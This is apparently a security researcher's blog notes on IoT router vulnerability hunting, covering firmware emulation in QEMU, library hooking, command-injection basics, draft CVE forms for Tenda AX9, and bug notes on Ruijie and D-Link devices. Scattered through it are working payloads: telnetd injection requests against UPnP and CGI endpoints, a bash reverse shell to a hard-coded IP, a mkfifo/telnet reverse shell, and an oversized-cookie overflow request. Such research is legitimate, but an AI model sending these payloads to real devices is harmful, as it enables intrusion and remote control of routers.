---
title: IOT 漏洞挖掘记录
date: 2023-04-24 00:28:59 +0800
categories: 
tags:
  - pwn
permalink: /posts/id=62/
pin: false
published:
---

主要是在学习的过程中记录一些笔记

## 资源下载

各大厂商的下载地址

Tenda: https://www.tenda.com.cn/download/default.html

D-Link: 

https://tsd.dlink.com.tw/

https://support.dlink.com/

https://www.dlinktw.com.tw/techsupport/AllPro.aspx

TP-Link: https://resource.tp-link.com.cn/?source=index

华为: https://support.huawei.com/enterprise/zh/software/index.html

NETGEAR/网件: http://support.netgear.cn/

ASUS/华硕: https://www.asus.com.cn/support/download-center/

cisco/思科: https://software.cisco.com/download/home

linksys/领势: https://www.linksys.com/linksys-support

H3C: http://www.h3c.com/cn/Service/Document_Software/Software_Download/

FAST迅捷: https://service.fastcom.com.cn/download-list.html

水星: https://service.mercurycom.com.cn/download-list.html

OpenWrt: https://downloads.openwrt.org/

海康威视: https://www.hikvision.com/cn/support/Downloads/Device-upgrade-package/

**官网没有固件下载链接**

到第三方下载 https://drivers.mydrivers.com/s-0-0/h0-0-0-0-3-1-1.htm

小米: https://xiaomifirmwareupdater.com/、https://mirom.ezbox.idv.tw/en/

Cisco/思科: https://doc.lagout.org/network/Cisco/


```Bash
armel:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/armel/debian_wheezy_armel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/armel/initrd.img-3.2.0-4-versatile
wget https://people.debian.org/~aurel32/qemu/armel/vmlinuz-3.2.0-4-versatile
# 2.6.32
wget https://people.debian.org/~aurel32/qemu/armel/debian_squeeze_armel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/armel/initrd.img-2.6.32-5-versatile
wget https://people.debian.org/~aurel32/qemu/armel/vmlinuz-2.6.32-5-versatile

armhf:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress
wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress

mipsel:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta

# 2.6.32
wget https://people.debian.org/~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-2.6.32-5-4kc-malta

mips:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/mips/debian_wheezy_mips_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-3.2.0-4-4kc-malta

# 2.6.32
wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta
```


## 黑客👴


近源渗透

https://tttang.com/archive/1888/#toc_wifi_1

wifipumpkin3

https://www.freebuf.com/sectool/265288.html

https://www.addx.top/2023/06/30/wifi%E9%92%93%E9%B1%BC%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8F%E9%97%AE%E9%A2%98/

https://lnng.top/posts/8b06.html#toc-heading-2







https://www.cnblogs.com/xs-xs/p/16329075.html

DHCP

https://blog.csdn.net/zegeai/article/details/109760837



## IOT知识学习📕

### 加密固件处理


### patch & hook

HOOK一共有四种方法，分别是

+ LD_PRELOAD
+ dl_open
+ LD_LIBRARY_PATH
+ 直接针对二进制文件的patch

```shell
# 查看libc 信息
cp $(which qemu-arm-static) .
sudo chroot . ./qemu-arm-static /lib/libc.so.6
or
strings ./lib/libc.so.0 | grep uClibc
```
### dl_open

```
mv libnvram.so libnvram_orig.so

```



### LD_PRELOAD

```shell
# glibc/eglibc编译 
arm-linux-gnueabi-gcc -shared -fPIC hook.c -o hook.so 


# uclibc 编译
cd ~/am-toolchains/brcm-arm-sdk/
export LD_LIBRARY_PATH="$PWD/hndtools-arm-linux-2.6.36-uclibc-4.5.3/lib"
# 基于 nvram_fake
./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -c -O2 -fPIC -Wall /home/ef4tless/nvram-faker/custom_nvram_r6250.c -o /home/ef4tless/nvram-faker/custom_nvram_r6250.o

./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -shared -nostdlib /home/ef4tless/nvram-faker/custom_nvram_r6250.o -o /home/ef4tless/nvram-faker/custom_nvram_r6250.so

# 基于 libnvram
./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -c -O2 -fPIC -Wall /home/ef4tless/libnvram/nvram.c -o /home/ef4tless/libnvram/firmadyne_nvram.o

./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -shared -nostdlib /home/ef4tless/libnvram/firmadyne_nvram.o -o /home/ef4tless/libnvram/firmadyne_libnvram.so


# 上传
scp ./hook.so root@192.168.2.2:/root/rootfs/

scp ./mini_httpd root@192.168.2.2:/root/rootfs/usr/sbin
```



```shell
# 运行
LD_PRELOAD=./hook.so ./usr/sbin/mini_httpd
# 注入环境变量
export LD_PRELOAD=./hook.so


# qemu usr mode / strace追踪
sudo chroot . ./qemu-arm-static ./usr/sbin/upnpd
sudo chroot . ./qemu-arm-static -strace ./usr/sbin/upnpd

sudo chroot . ./qemu-arm-static -E LD_PRELOAD="./custom_nvram_r6250.so ./lib/libdl.so.0" /usr/sbin/upnpd

sudo chroot . ./qemu-arm-static -E LD_PRELOAD="/firmadyne_libnvram.so" ./usr/sbin/upnpd



# 查看启动端口
sudo lsof -i | grep qemu


# 按字符串搜索
cd rootfs
grep -r "mini_httpd" ./

```




```shell
# start.sh

mipsel:
qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta \
    -hda debian_wheezy_mipsel_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" \
    -netdev tap,id=tapnet,ifname=tap0,script=no \
    -device rtl8139,netdev=tapnet -nographic
    
mips:
qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta \
    -hda debian_wheezy_mips_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" \
    -netdev tap,id=tapnet,ifname=tap0,script=no \
    -device rtl8139,netdev=tapnet -nographic
    
armel:
qemu-system-arm \
    -M versatilepb \
    -kernel vmlinuz-3.2.0-4-versatile \
    -initrd initrd.img-3.2.0-4-versatile \
    -hda debian_wheezy_armel_standard.qcow2 \
    -append "root=/dev/sda1" -net nic \
    -net tap,ifname=tap0,script=no,downscript=no \
    -nographic

armhf:
qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \
    -initrd initrd.img-3.2.0-4-vexpress \
    -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \
    -append "root=/dev/mmcblk0p2" -net nic \ 
    -net tap,ifname=tap0,script=no,downscript=no -nographic
    
arm64:
```



GDB调试

```
# gdbserver


gdb







```



### 挖掘技巧tips和知识点

```sh
sudo vim /etc/ssh/sshd_config
PasswordAuthentication改成yes

vsnprintf(str, 0x400u, format, va);
按照format的格式（%s），将va传入str

例如 va是栈上列表/format为%S %S %S
+0000000C filename:.word ?
+00000010 re_addr:.word ?
+00000014 re_port:.word ?

str为 filename re_addr re_port

ida查找字段 Alt+t

fopen函数的mode参数有以下几种：
"r"：以只读方式打开文件。文件必须存在，否则打开失败。
"w"：以写方式打开文件。如果文件不存在，则创建文件；如果文件已存在，则清空文件内容。
"a"：以追加方式打开文件。如果文件不存在，则创建文件；如果文件已存在，则在文件末尾追加内容。
"r+"：以读写方式打开文件。文件必须存在，否则打开失败。
"w+"：以读写方式打开文件。如果文件不存在，则创建文件；如果文件已存在，则清空文件内容。
"a+"：以读写方式打开文件。如果文件不存在，则创建文件；如果文件已存在，则在文件末尾追加内容。
除了以上六种模式外，还可以在模式字符串中添加"b"字符，表示以二进制方式打开文件。例如，"rb"表示以只读方式打开二进制文件。

bash脚本`ls`命令执行
使用 && 连接两个命令时，第二个命令只有在第一个命令成功执行（即返回状态码为0）之后才会执行

用FAP启动好固件后，需要用echo 0 > /proc/sys/kernel/randomize_va_space命令关闭地址随机化（ASLR）

# 在当前目录查找
grep -r "CVE-2022-45511" ./
```



hnap

upnp

```
cgibin会作为 “请求验证文件” ，对用户的请求进行验证并解析，再将解析后的数据传给对应的文件，进行下一步的操作。

SSDP（简单服务发现协议），SOAP（简单对象访问协议）与GENA（通用事件通知体系） ，其分别对应ssdpcgi（在/htdocs/upnp目录下），soap.cgi（在/htdocs/upnp/docs/LAN-1目录下），gena.cgi（在/htdocs/upnp/docs/LAN-1目录下）


/usr/sbin/upnp 中则包含了请求规则
```

SSDP

```
调用端口查询
/var/run/httpd.conf



# 称为HTTPU协议（即基于UDP的HTTP）


M-SEARCH * HTTP / 1.1  
host：239.255.255.250 ：1900  
MAN：ssdp：discover  
MX：10  
ST：ssdp:all

UUID
Universally Unique Identifier，通用唯一识别码。目的是让分布式系统中的所有元素，都有唯一辨识咨询，定义格式为：xxxxxxxx-xxxx-xxxx-xxxxxxxxxxxxxxxx(8-4-4-16),分别为当前日期和时间，时钟序列，全局唯一的IEEE机器识别号，如果有网卡，从网卡mac地址获得，没有网卡以其他方式获得。
UDN
单一设备名（Unique Device Name），基于UUID，表示一个设备。在不同的时间，对于同一个设备此值应该是唯一的。
URN
URL的一种更新形式，统一资源名称(URN,Uniform Resource Name)。唯一标识一个实体的标识符，但是不能给出实体的位置。标识持久性Internet资源。URN可以提供一种机制，用于查找和检索定义特定命名空间的架构文件。尽管普通的URL可以提供类似的功能，但是在这方面，URN 更加强大并且更容易管理，因为 URN 可以引用多个 URL。
Mx
1到5之间的一个值，表示最大的等待应答的秒数。
ST
Seatch Targer，表示搜索的节点类型。

# 应答
HTTP/1.1 200 OK\r\n
CACHE-CONTROL: max-age=120\r\n
ST: uuid:75802409-bccb-40e7-8e6c-40a5ef100e92\r\n
USN: uuid:75802409-bccb-40e7-8e6c-40a5ef100e92\r\n
EXT:\r\n
SERVER: RT-N56U/3.4.3.9 UPnP/1.1 MiniUPnPd/2.0\r\n
LOCATION: http://192.168.100.1:24795/rootDesc.xml\r\n
OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01\r\n
01-NLS: 1652586384\r\n
BOOTID.UPNP.ORG: 1652586384\r\n
CONFIGID.UPNP.ORG: 1337\r\n
\r\n
```

gena

```
SUBCRIBE

request = b"SUBSCRIBE /gena.cgi?service=" + b"`telnetd -p 7777`" + b" HTTP/1.1\r\n"
request += b"Host: localhost:49152\r\n"
request += b"Callback: http:///\r\n"
request += b"NT: upnp:event\r\n"
request += b"Timeout: Second-2333\r\n\r\n"
service=后面的内容，再先看到SUBCRIBE请求方式对应的sub_41A390函数：
```



soap

```
from socket import *
from os import *
from time import *
 
request = b"POST /soap.cgi?service=&&telnetd -p 8888&& HTTP/1.1\r\n"
request += b"Host: localhost:49152\r\n"
request += b"Content-Type: text/xml\r\n"
request += b"Content-Length: 88\r\n"
request += b"SOAPAction: a#b\r\n\r\n"
```



### 基础知识

windows dns刷新

```shell
ipconfig /flushdns
```





### 网络编程

参考：https://nuoye-blog.github.io/2020/05/20/6e2d1109/

`socket(2, 2, 0)` 
调用创建了一个IPv4(AF_INET，因为第一个参数是2)的流式套接字(SOCK_STREAM，因为第二个参数是2)，第三个参数指定的是使用默认的协议(通常是TCP)。

bind绑定到servaddr，相应的IP端口

```c
bind(socket_fd, (struct sockaddr*)&servaddr, sizeof(servaddr)
```

listen监听端口

```C
listen(socket_fd, 10)
```



connect用于连接到指定servaddr的

```c
connect(socket_fd, (struct sockaddr*)&servaddr, sizeof(servaddr)
```









` 0x7F000001` 表示使用回环地址(127.0.0.1)





### 病毒分析

| Sha256   | 81f67502d9cf92a9ff03b2f3837ae1cdda7db8e9624ad82106723b520c43fe5a |
| -------- | ------------------------------------------------------------ |
| SHA1     | cc7af791ac2a977d5d6a4609fc4438085d0becd5                     |
| MD5      | 63374c5d751d2648c578b46eb6573958                             |
| 文件类型 | EXE                                                          |
| 文件大小 | 24.65MB                                                      |
| 文件名称 | 集团终端自检工具第一版.exe                                   |
| 功能描述 | Sliver木马                                                   |
| 技术特点 | 经分析该木马是一个加壳的Sliver。                             |

### 命令注入

#### 常见危险函数
php
- system
- exec
- passthru
- shell_exec
- popen
- proc_open

python
- system
- popen
- subprocess.call
- spawn

java
- java.lang.Runtime.getRuntime().exec(command)



#### 可注入分割符和注入命令

__单引号要闭合__! 因为单引号中，\`\` 和 $ 和 ；不会被识别执行，双引号分号识别不了


```shell
#  可注入分割符
%0a
%0d 
;
&
|
$(shell_command)
`shell_command`
{shell_command,}
```

1、分号`;`分割


2、`||` `&&` `&` `|`分割

  ||(或者)当前面的执行出错时执行后面的

  &&(和)当前一条命令执行成功后面的命令才会执行

  &将前边的命令放在后台执行
  
  | 管道符  显示后面的命令的执行结果

3、`\r\n` `%0d%a0` 换行

主要用于报文里拼接
%0a 即 \n
%0d 即 \r

4、反引号解析和 `$()` 替换

如果在一条命令中出现了反引号，系统会首先执行反引号内的命令，然后将执行结果作为xclibc的参数

5、额外的一些拼接

双大括号字符组合输出

cat {./te,st}{st,st}
to
./test test stst stst

\> 用于重定向，如果目标文件已经存在则覆盖其中的内容


注入命令
```shell

wget dnslog.cn

telnetd

sh -c "sh -i >& /dev/tcp/150.158.144.112/1234 0>&1"\x00

```

telnet反弹，防止没有telnetd

```shell
'$(mkfifo /tmp/test;telnet 192.168.45.66 6666 0</tmp/test|/bin/sh > /tmp/test)'
```

### 正则分析

```php
$reg = "/^(http(s?):\/\/){0,1}(?:[A-za-z0-9-]+\.)+[A-Za-z]{2,4}(?:[\/\?#][\/=\?%\-&~`@[\]\':+!\.#\w]*)?$/";
```

1. **定界符**：

   - 正则表达式通常被定界符包围，这里使用的是正斜线 `/`。定界符可以是任意非字母数字、非反斜线、非空白字符。

2. **开始 (`^`) 和结束 (`$`) 锚点**：

   - `^` 表示正则表达式应该从字符串的开始处开始匹配。
   - `$` 表示正则表达式应该在字符串的结尾处结束。
   - 这两个符号确保整个字符串完全符合正则表达式的模式。

3. **协议匹配**：

   - `(http(s?):\/\/){0,1}` 用于匹配 URL 的协议部分。
   - `http` 后面的 `(s?)` 表示 's' 字符可有可无，用于匹配 'http' 或 'https'。
   - `:\/\/` 是对冒号和两个正斜线的直接匹配。
   - `{0,1}` 表示前面的整个模式可以出现 0 次或 1 次。

4. **域名匹配**：

   - `(?:[A-Za-z0-9-]+\.)+` 匹配域名。
   - `[A-Za-z0-9-]+` 匹配一个或多个字母、数字或连字符。
   - `\.` 匹配点号（`.`）。在正则表达式中，点号通常表示任意字符，所以需要用反斜线转义。
   - 后面的 `+` 表示前面的模式（即一个标签，如 `example`）可以出现一次或多次。

5. **顶级域名匹配**：

   - `[A-Za-z]{2,4}` 匹配顶级域名（如 `.com`、`.net`）。
   - `{2,4}` 表示前面的字符模式至少出现 2 次，最多出现 4 次。

6. **可选的 URL 部分**：

   - `(?:[\/\?#][\/=\?%\-&~`@[]':+!.#\w]*)?` 用于匹配 URL 的路径、查询参数等可选部分。
   - `[\/\?#]` 首先匹配一个正斜线、问号或井号。
   - 后面的部分 `[\/=\?%\-&~`@[]':+!.#\w]*` 匹配 URL 中可能出现的各种字符，包括斜线、等号、百分号、连字符等。
   - `*` 表示前面的模式可以出现任意次，包括零次。
   - 最后的 `?` 表示这整个部分是可选的。

   

1. **分组** (`()`):
   - 在正则表达式中，圆括号用于创建分组。这允许您将多个字符或表达式组合在一起，以便对整个组执行操作（如重复、匹配等）。
   - 分组还有一个附加功能：它们可以捕获匹配的内容，这意味着您可以在正则表达式的其余部分或者在替换操作中引用这部分匹配的文本。
2. **非捕获分组** (`(?:...)`):
   - 有时候，您只需要分组的组合功能，而不需要捕获功能。在这种情况下，就可以使用非捕获分组。
   - 在分组的开始加上 `?:`（紧跟在左圆括号后面）来创建一个非捕获分组。这样，正则表达式引擎就不会保存这个分组匹配的内容，从而节省资源。

在正则表达式中，`\w` 匹配任何字母数字字符，包括下划线。这意味着它匹配所有的小写和大写字母（a-z, A-Z）、数字（0-9）以及下划线（\_）。



## 路由器一篮子流程🐄


统计所有接口


lua luci框架搜索路由

```shell
grep -Rs "entry({\"api"
```

危险函数

```shell
os.execute, forkExec, io.popen
```

`[%w_-]+`: 这是一个字符类模式。

在 Lua 中，`%w` 匹配所有字母和数字，`_` 匹配下划线字符，`-` 匹配连字符。方括号 `[]` 创建一个字符集，匹配集合中的任意单个字符。加号 `+` 表示匹配字符集中的一个或多个字符。


qemu模拟

```shell
# 用户级qemu
sudo cp $(which qemu-arm-static) .
# sudo cp $(which qemu-mipsel-static) .
# sudo chroot . ./qemu-arm-static /lib/libc.so.6
sudo chroot . ./qemu-arm-static /bin/httpd

#-------------------------------------------------------------------
# 系统级qemu（桥接）
# 配置本机网卡
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.2.1/24

# 启动虚拟机
./start.sh
# qemu内网络配置
ifconfig eth0 192.168.2.2
# ifconfig eth1 192.168.2.2
service ssh start

# 上传文件系统-主机
tar czf rootfs.tar.gz ./rootfs
sudo scp ./rootfs.tar.gz root@192.168.2.2:/root/

# 上传文件系统-qemu
tar -zxvf ./rootfs.tar.gz
chmod -R 777 ./rootfs
# chmod -R 777 ./squashfs-root

# 挂载文件系统
mount -o bind /dev ./rootfs/dev && mount -t proc /proc ./rootfs/proc
# mount -o bind /dev ./squashfs-root/dev && mount -t proc /proc ./squashfs-root/proc
# mount -o bind /dev ./cpio-root/dev && mount -t proc /proc ./cpio-root/proc
chroot ./rootfs sh
# chroot ./squashfs-root sh
```


## CVE提交本地表单

提交平台：https://cveform.mitre.org/

### AX12+AX9

1
__Vulnerability type__
Command injection

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
AX9 V22.03.01.46

__Impact__
Code Execution

Code Execution/Denial of Service
__Affected component(s)__
In the /goform/SetNetControlList feature, the list parameter is passed to sscanf without validation and then further passed to update_dev_name, it is concatenated with an SQL command in snprintf, leading to command injection.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/AX9/SetNetControlList-2.md
__Suggested description of the vulnerability for use in the CVE__
Tenda AX9 V22.03.01.46 has been discovered to contain a SQL command injection vulnerability in the 'list' parameter at /goform/SetNetControlList.
__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd

2
__Vulnerability type__
Command injection

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
AX9 V22.03.01.46

__Impact__
Code Execution

Code Execution/Denial of Service
__Affected component(s)__
In the `/goform/SetNetControlList` function, the `list` parameter is passed to `sscanf` without validation and then further passed to `add_tc_traffic_control`.Inside this function, command concatenation occurs in `snprintf`.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/AX9/SetNetControlList-3.md
__Suggested description of the vulnerability for use in the CVE__
Tenda AX9 V22.03.01.46 has been discovered to contain a command injection vulnerability in the 'list' parameter at /goform/SetNetControlList.
__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd


3
__Vulnerability type__
Command injection

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
AX9 V22.03.01.46

__Impact__
Code Execution

Code Execution/Denial of Service
__Affected component(s)__
In the `/goform/SetOnlineDevName` feature, the `mac` parameter is passed to the `update_dev_name` function without validation. This parameter is concatenated with an SQL command in `snprintf`, leading to a command injection vulnerability.

__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/AX9/SetNetControlList.md
__Suggested description of the vulnerability for use in the CVE__
Tenda AX9 V22.03.01.46 has been found to contain a stack overflow vulnerability in the 'list' parameter at /goform/SetNetControlList.
__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd

4
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
AX9 V22.03.01.46

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the /goform/SetNetControlList function, passing a value to the list parameter assigns it to v1. This then leads to a call to the sub_43FBBC function. Within this function, the strcpy function triggers a stack overflow.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/AX9/SetOnlineDevName.md
__Suggested description of the vulnerability for use in the CVE__
Tenda AX9 V22.03.01.46 has been discovered to contain a SQL command injection vulnerability in the 'mac' parameter at /goform/SetOnlineDevName.
__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd









## 设备信息收集

### dlink

DIR-830L

DIR-895L

DIR-890L

DIR-885L

DIR-880L

[DIR-850L](javascript:void(0);)

DIR-826L

DIR-820L

DIR-816L

DIR-810L





参考文章：https://mp.weixin.qq.com/s/9mmccpJVYOvib_af6DAOow





DIR-859

https://medium.com/@s1kr10s/d-link-dir-859-unauthenticated-information-disclosure-en-faf1a9a13f3f







# 漏洞挖掘记录 ⛏️

## cisco RV340(1.0.03.29 )

img固件，openwrt开发

7zip提取ubi镜像，将得到的ubi格式img用binwalk进行解压

依次启动nginx服务

```Bash
/etc/init.d/boot boot
generate_default_cert
/etc/init.d/confd start
/etc/init.d/nginx start
```

## tenda w30e

似乎固件内没有完整的web页面文件，暂且搁置😢



漏洞点功能一般是在httpd

```shell
cp $(which qemu-arm-static) .
sudo chroot . ./qemu-arm-static bin/httpd

#qemu启动httpd程序目，并开启调试端口
sudo chroot . ./qemu-arm-static -g 1234 ./bin/httpd


#查看可执行程序需要的动态链接库
readelf -d ./bin/httpd | grep NEEDED
#列出所有的函数名，与要寻找的函数对比
nm -D ./lib/libcommon.so

```

## tenda W20E(v15.11.0.6)

- qemu-arm-static可以直接使用**, **链接`webroot_ro`到`/webroot`
- 然后发现httpd无法监听80端口, 显示g_lan_ip=0.
- IDA和查看webroot_ro发现default.cfg中存了g_lan_ip, 为非零值, GetValue函数负责读取该文件. 
- 进到libcommon.so.0发现该函数和cfmd进程通信获取的该数值, 而cfmd的启动又需要mtd设备等等,  于是**自己写一个GetValue函数进行hook, 直接使用文件读取**: https://pastebin.ubuntu.com/p/8tQXJHQd3h/
- 查看`/lib`下的libc, 发现是uClibc, 编译参考[这里](https://iotsec-zone.com/article?id=202#4、Netgear  R8300固件模拟（qemu-user）):

```Bash
#compile lib.so
LD_LIBRARY_PATH=/root/tools/IOT/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3/lib
apt install libelf-dev:i386  
ln -s /root/tools/IOT/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc /bin/ugcc
ugcc -shared -fPIC -Wall getvalue.c -o getvalue.so
#in chroot env:
./qemu-arm-static -E LD_PRELOAD=/getvalue.so /bin/httpd
```

- 发现无法登陆, 什么密码都不行. 于是找到登陆函数`authSecurityHandler`****patch跳过密码strcmp.
- 叕发现网页卡住了无法显示设置的选项和按钮,安装gdb-multiarch调试了下. 在网页卡住时ctrl+c中断后又继续运行, 就不卡了, 还显示`ucloud_p_sem: syscall interrupt`, **patch了ucloud_p_sem函数.**
- 某些poc就是在乱写, 发现在`parseFirstLine`函数中有URI too big的2048长度限制, 把一些栈溢出的长度改在这个限制之内即可验证. 



## totolink A7000R\NR1800X\X5000R

通过github Action环境的docker+qemu-system系统模式搭建：

1.docker中安装qemu-system-mipsel，需要提前将固件文件系统上传到qemu启动的镜像文件中(本地使用tap起qemu将文件系统scp过去，或者别的方式也可以)

2.编写sh脚本实现qemu-system-mipsel自动登录

3.dockerfile编写安装需要的依赖

sh脚本(别的系统需要修改为对应系统名)

```Bash
cd /root/
/usr/bin/expect<<EOF
set timeout 10000

spawn qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic \
    -net user,hostfwd=tcp::80-:80 -nographic

expect "debian-mipsel login:"
send "root\r"

#expect "root@debian-mipsel:~# "
#send "echo 0 > /proc/sys/kernel/randomize_va_space\r"

expect "Password:"
send "root\r"

expect "root@debian-mipsel:~# "
send "mount -o bind /dev ./squashfs-root/dev && mount -t proc /proc ./squashfs-root/proc\r"

expect "root@debian-mipsel:~# "
send "chroot squashfs-root/ /bin/sh\r"

expect "# "
send "ifconfig\r"

expect "# "
send "./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf\r"
expect "# "

expect eof
EOF
#cd /root/squashfs-root
#./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf
sleep infinity;
```

Dockerfile

```Bash
FROM ubuntu:16.04

RUN apt update \
    && apt install -y qemu-system-mipsel \
    && apt install -y xz-utils \
    && apt install -y net-tools \
    && apt install -y expect \
    && apt install -y bridge-utils uml-utilities openssh-server

COPY debian_wheezy_mipsel_standard.qcow2 /root/debian_wheezy_mipsel_standard.qcow2

COPY vmlinux-3.2.0-4-4kc-malta /root/vmlinux-3.2.0-4-4kc-malta

COPY start.sh /root/start.sh

CMD [ "/bin/sh", "-c", "/root/start.sh" ]
```

构建好docker后，就可以将容器上传到自己的github仓库

然后exploit_db中使用的dockerfile可以直接这样

```Bash
FROM xxx/xxx:version
```

这样就能解决github action中跑docker，同时，docker上运行qemu-system的各种问题



## tplink ER5120G

CVE-2023-43138	TPLINK TL-ER5120G 4.0 2.0.0 Build 210817 Rel.80868n存在命令注入漏洞，攻击者在认证后添加NAPT规则，且规则名称带有注入点。
CVE-2023-43137	TPLINK TL-ER5120G 4.0 2.0.0 Build 210817 Rel.80868n存在命令注入漏洞，攻击者在认证后添加ACL规则，规则名称参数存在注入点。

CVE-2023-43135    TP-LINK ER5120G 4.0 2.0.0 Build 210817 Rel.80868n中存在未授权访问漏洞，攻击者无需身份验证即可获取设备敏感信息，获取用户令牌，最终登录设备后台管理。





## dlink 900WO



## tplink IP43AN









## ruijie WS6008_WS6108



/tmp/html/web/routers/common/system/file.lua   downFiles

sbin/auto_route/routelib.lua  routelib.get_pub_network_intf_and_sip



```shell
cd '/data/sourcedir'
rm -f '/tmp/vsd/0/destination.tar'
tar -cf '/tmp/vsd/0/destination.tar' 'file1.txt' 'file2.txt'
sync
```



```http
POST /web/init.lua/common.system.file/downFiles HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 44
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: LOCAL_LANG_COOKIE=zh; UI_LOCAL_COOKIE=zh; SIDS=F1734C792A0F5152FF2BC70F48738AA1; login=1; mac=0074.9c0c.797b; oid=1.3.6.1.4.1.4881.1.3.1.1.115; hotback_num=128; MODE_LOCAL=0; main_ui_cookie=menu_file_manage
Host: 192.168.1.2
Origin: https://192.168.1.2
Referer: https://192.168.1.2/common/file/file-admin.htm
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Connection: close


params=%7B%22src%22%3A%22%2Fdata%22%2C%22dst%22%3A%221.tar%22%2C%22list%22%3A%5B%221%27%3Btelnetd%27%22%5D%7D
```



## datacon

https://xz.aliyun.com/t/5808#toc-0





uhttpd : 0x8052612/0x8051BF2

```
ustream_printf(cl_0->us, "Location: %s\r\n\r\n", string_1);
ustream_printf(cl_0->us, "%s: %s\r\n", v4, string_0);
```

odhcpd: 0x4AAB 

```
v10 = strcpy(addr4.s_addr, name)
```

0x5DBB

```
v96 = malloc(v95 + 1);
```

0x5F69

```c
v105 = realloc(*(v7 + 584), 4 * v104);
```







## dlink dir-850L

#### bug1

```http
POST /pigwidgeon.cgi HTTP/1.0

Host: shareport.local

Cookie: uid=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Prefix: asasdaw

Cache-Control: max-age=0

Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"

Sec-Ch-Ua-Mobile: ?0

Sec-Ch-Ua-Platform: "Linux"

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: none

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 21
```



#### bug2

```http
GET /scandir.sgi?action=umnt&en=;telnetd -&path=aaa&where=bbb HTTP/1.0

Host: shareport.local

Cookie: uid=unUFIr9ia

Cache-Control: max-age=0

Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"

Sec-Ch-Ua-Mobile: ?0

Sec-Ch-Ua-Platform: "Linux"

